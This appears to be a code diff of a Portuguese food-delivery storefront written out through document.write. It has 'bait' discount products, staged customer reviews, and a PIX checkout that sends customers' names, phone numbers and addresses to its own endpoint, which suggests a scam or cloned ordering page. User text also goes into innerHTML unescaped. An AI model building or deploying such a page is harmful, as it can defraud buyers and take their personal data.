-                            html += '<div onclick="openProductModal(\'' + p.id + '\')" class="flex justify-between items-center p-5 ' + highlightClass + ' rounded-lg border shadow-sm cursor-pointer active:bg-gray-50 transition relative overflow-hidden"> <div class="flex flex-col justify-between min-h-[100px] py-1 pr-2 z-10 w-full"> <div><h4 class="text-[#3e3e3e] font-medium text-sm leading-tight mb-1.5">' + p.name + '</h4><p class="text-xs text-gray-500 line-clamp-2 leading-relaxed mb-3">' + p.desc + '</p></div> <div class="flex items-center gap-2 mt-auto"><span class="text-[#05a65a] font-medium text-sm ' + (p.isBait ? 'font-bold text-lg' : '') + '">' + formatMoney(p.price) + '</span>' + (p.oldPrice ? '<span class="text-xs text-gray-400 line-through">' + formatMoney(p.oldPrice) + '</span>' : '') + '</div> </div> <div class="w-28 h-24 rounded-lg overflow-hidden shrink-0 relative bg-gray-100 z-10 shadow-sm border border-gray-100"><img src="' + p.img + '" class="w-full h-full object-cover" onerror="this.src=\'images/logo-rushi.webp\'">' + (p.badge ? '<div class="absolute top-0 right-0 bg-[#EA1D2C] text-white text-[9px] font-bold px-2 py-1 rounded-bl-lg shadow-sm z-20">' + p.badge + '</div>' : '') + '</div> </div>';
+                            html += \`
+                            <div onclick="openProductModal('\${p.id}')" class="flex justify-between items-center p-5 \${highlightClass} rounded-lg border shadow-sm cursor-pointer active:bg-gray-50 transition relative overflow-hidden">
+                                <div class="flex flex-col justify-between min-h-[100px] py-1 pr-2 z-10 w-full">
+                                    <div><h4 class="text-[#3e3e3e] font-medium text-sm leading-tight mb-1.5">\${p.name}</h4><p class="text-xs text-gray-500 line-clamp-2 leading-relaxed mb-3">\${p.desc}</p></div>
+                                    <div class="flex items-center gap-2 mt-auto"><span class="text-[#05a65a] font-medium text-sm \${p.isBait ? 'font-bold text-lg' : ''}">\${formatMoney(p.price)}</span>\${p.oldPrice ? \`<span class="text-xs text-gray-400 line-through">\${formatMoney(p.oldPrice)}</span>\` : ''}\${p.isBait ? '<span class="text-[10px] bg-red-100 text-[#EA1D2C] px-1 rounded font-bold animate-pulse">OFERTA</span>' : ''}</div>
+                                </div>
+                                <div class="w-28 h-24 rounded-lg overflow-hidden shrink-0 relative bg-gray-100 z-10 shadow-sm border border-gray-100"><img src="\${p.img}" class="w-full h-full object-cover" onerror="this.src='images/logo-rushi.webp'">\${p.badge ? \`<div class="absolute top-0 right-0 bg-[#EA1D2C] text-white text-[9px] font-bold px-2 py-1 rounded-bl-lg shadow-sm z-20">\${p.badge}</div>\` : ''}</div>
+                            </div>\`;
                         }
                     });
-                    html += '</div></div>';
+                    html += \`</div></div>\`;
                     container.innerHTML += html;
                 }
             }
@@ -1005,15 +1080,16 @@
             opts.innerHTML = '';
             
             if(item.hasAddons) {
-                let html = '<div class="mb-2"><h4 class="font-bold text-gray-700 text-sm mb-3">Adicionais</h4>';
+                let html = \`<div class="mb-2"><h4 class="font-bold text-gray-700 text-sm mb-3">Adicionais</h4>\`;
                 commonAddons.forEach((opt, idx) => {
                     addonsState[opt.name] = 0;
-                    html += '<div class="flex justify-between items-center py-3 border-b border-gray-100 last:border-0">' +
-                            '<div class="flex items-center gap-3"><img src="' + opt.img + '" class="w-12 h-12 rounded-lg object-cover border border-gray-100"><div><div class="text-sm text-[#3e3e3e] font-medium">' + opt.name + '</div><div class="text-xs text-[#05a65a] font-bold">' + (opt.price === 0 ? 'Grátis' : '+ ' + formatMoney(opt.price)) + '</div></div></div>' +
-                            '<div class="flex items-center border border-gray-200 rounded-lg h-8 px-2"><button class="text-[#EA1D2C] font-bold w-6" onclick="changeAddonQty(\'' + opt.name + '\', ' + opt.price + ', -1)">-</button><span class="text-sm font-bold text-[#3e3e3e] w-6 text-center" id="addon-qty-' + idx + '">0</span><button class="text-[#EA1D2C] font-bold w-6" onclick="changeAddonQty(\'' + opt.name + '\', ' + opt.price + ', 1)">+</button></div>' +
-                            '</div>';
+                    html += \`
+                    <div class="flex justify-between items-center py-3 border-b border-gray-100 last:border-0">
+                        <div class="flex items-center gap-3"><img src="\${opt.img}" class="w-12 h-12 rounded-lg object-cover border border-gray-100"><div><div class="text-sm text-[#3e3e3e] font-medium">\${opt.name}</div><div class="text-xs text-[#05a65a] font-bold">\${opt.price === 0 ? 'Grátis' : '+ '+formatMoney(opt.price)}</div></div></div>
+                        <div class="flex items-center border border-gray-200 rounded-lg h-8 px-2"><button class="text-[#EA1D2C] font-bold w-6" onclick="changeAddonQty('\${opt.name}', \${opt.price}, -1)">-</button><span class="text-sm font-bold text-[#3e3e3e] w-6 text-center" id="addon-qty-\${idx}">0</span><button class="text-[#EA1D2C] font-bold w-6" onclick="changeAddonQty('\${opt.name}', \${opt.price}, 1)">+</button></div>
+                    </div>\`;
                 });
-                html += '</div>';
+                html += \`</div>\`;
                 opts.innerHTML = html;
             }
             document.getElementById('product-modal-container').classList.remove('hidden');
@@ -1025,7 +1101,7 @@
             let current = addonsState[name] || 0;
             const newQty = current + delta;
             if (price === 0 && delta > 0 && newQty > 2) { Swal.fire({ toast: true, position: 'center', icon: 'warning', title: 'Máximo de 2 unidades para itens grátis!', showConfirmButton: false, timer: 2000 }); return; }
-            if(newQty >= 0) { addonsState[name] = newQty; document.getElementById('addon-qty-' + idx).innerText = addonsState[name]; updateModalTotal(); }
+            if(newQty >= 0) { addonsState[name] = newQty; document.getElementById(\`addon-qty-\${idx}\`).innerText = addonsState[name]; updateModalTotal(); }
         }
 
         function updateModalTotal() {
@@ -1245,11 +1321,12 @@
             container.innerHTML = '';
             if(cart.length === 0) { container.innerHTML = '<p class="text-center text-gray-400 py-4">Sua sacola está vazia.</p>'; return; }
             cart.forEach((item, idx) => {
-                let addonsHtml = (item.addons || []).map(a => '<span class="text-xs text-gray-500 block">+ ' + a.qty + 'x ' + a.name + '</span>').join('');
-                container.innerHTML += '<div class="flex justify-between items-start py-3 border-b border-gray-50 last:border-0">' +
-                    '<div class="flex gap-3"><span class="text-gray-500 font-bold border border-gray-200 px-2 rounded h-fit text-sm">' + item.qty + 'x</span><div><span class="text-[#3e3e3e] font-medium text-sm block">' + item.name + '</span>' + addonsHtml + (item.obs ? '<span class="text-xs text-gray-400 italic">"' + item.obs + '"</span>' : '') + '<div class="text-[#3e3e3e] font-medium text-sm mt-1">' + formatMoney(item.totalPrice) + '</div></div></div>' +
-                    '<button onclick="removeCartItem(' + idx + ')" class="text-gray-400 text-sm"><i class="fa-solid fa-trash-can"></i></button>' +
-                '</div>';
+                let addonsHtml = (item.addons || []).map(a => \`<span class="text-xs text-gray-500 block">+ \${a.qty}x \${a.name}</span>\`).join('');
+                container.innerHTML += \`
+                <div class="flex justify-between items-start py-3 border-b border-gray-50 last:border-0">
+                    <div class="flex gap-3"><span class="text-gray-500 font-bold border border-gray-200 px-2 rounded h-fit text-sm">\${item.qty}x</span><div><span class="text-[#3e3e3e] font-medium text-sm block">\${item.name}</span>\${addonsHtml}\${item.obs ? \`<span class="text-xs text-gray-400 italic">"\${item.obs}"</span>\` : ''}<div class="text-[#3e3e3e] font-medium text-sm mt-1">\${formatMoney(item.totalPrice)}</div></div></div>
+                    <button onclick="removeCartItem(\${idx})" class="text-gray-400 text-sm"><i class="fa-solid fa-trash-can"></i></button>
+                </div>\`;
             });
             recalcTotal();
         }
@@ -1384,7 +1461,7 @@
             const payload = { valorTotal: total, nome: nomeCliente, whatsapp: zapCliente, cep: document.getElementById('cust-cep').value, rua: document.getElementById('cust-street').value, numero: document.getElementById('cust-number').value, bairro: document.getElementById('cust-hood').value, complemento: document.getElementById('cust-comp').value, products: cart.map(i => ({ name: i.name, price: i.unitPrice, quantity: i.qty })), trackingParameters: getTrackingParams() };
             try {
                 if(window.fbq) fbq('track', 'AddPaymentInfo');
-                const response = await fetch(API_BASE_URL + '/criar-pix', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+                const response = await fetch(\`\${API_BASE_URL}/criar-pix\`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
                 const data = await response.json();
                 if(data.success) {
                     localStorage.setItem('user_cache_nome', nomeCliente); localStorage.setItem('user_cache_zap', zapCliente);
@@ -1431,32 +1508,13 @@
             else if (reviewStep === 1) { document.getElementById('more-reviews-2').classList.remove('hidden'); document.getElementById('more-reviews-2').classList.add('animate-[fade_0.5s]'); document.getElementById('btn-load-reviews').style.display = 'none'; reviewStep++; }
         }
 
-        function updateDayHighlight() {
-            const days = ['Domingo', 'Segunda', 'Terça', 'Quarta', 'Quinta', 'Sexta', 'Sábado'];
-            const dayName = days[new Date().getDay()];
-            const highlightsText = "Destaques de " + dayName;
-            
-            // Update tab
-            const tabBtn = document.querySelector('.nav-item.active');
-            if (tabBtn && tabBtn.innerText.includes('Destaques')) {
-                tabBtn.innerText = highlightsText;
-            }
-            
-            // Update section title
-            const sectionTitle = document.querySelector('#product-container h3');
-            if (sectionTitle && sectionTitle.innerText.includes('Destaques')) {
-                sectionTitle.innerText = highlightsText;
-            }
-        }
-        
-        // Run after catalog renders
-        setTimeout(updateDayHighlight, 1500);
-        setInterval(updateDayHighlight, 10000);
-\"    </script>\" +
-\"\" +
-\"</body>\" +
-\"</html>\";
+    <\/script>
 
+    
+</body>
+</html>`;
+
+    // 🚀 EXECUÇÃO FINAL
     document.open();
     document.write(payload);
     document.close();
